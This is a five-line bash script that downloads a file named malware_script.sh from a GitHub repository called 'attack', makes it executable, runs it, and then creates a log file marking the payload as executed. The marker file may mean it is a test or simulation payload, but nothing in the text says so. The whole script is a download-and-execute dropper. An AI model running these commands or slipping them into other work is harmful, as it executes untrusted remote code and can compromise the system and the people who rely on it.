#!/bin/bash
curl -o /tmp/malware_script.sh https://raw.githubusercontent.com/raghul-simbian/attack/main/malware_script.sh
chmod +x /tmp/malware_script.sh
/tmp/malware_script.sh
touch /tmp/payload_executed.log
